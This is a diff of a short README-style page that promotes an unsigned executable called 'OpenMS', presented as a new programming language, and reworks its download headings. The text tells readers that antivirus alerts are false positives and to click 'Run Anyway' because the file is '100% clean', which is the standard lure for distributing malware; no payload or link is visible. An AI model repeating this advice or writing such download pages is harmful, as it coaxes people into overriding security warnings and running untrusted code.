@@ -5,10 +5,9 @@ I have created a new programming language called OpenMS! It has been built using
 The best part is its simplicity. With just 3 lines of code, you can create and render complex things instantly.
 
 Note: This tool is free to use and shared as a compiled executable. Since it is an independent, unsigned tool, your Windows antivirus might show a "False Positive" warning upon downloading. You can safely click 'Run Anyway' as the system is 100% clean and built for performance testing.
+Download the tool and test it out here:
 
-# Download the tool and test it out here:
-
-
+# Download now
 
 |OpenMS programming language| Download 
 |:--- |:--- 
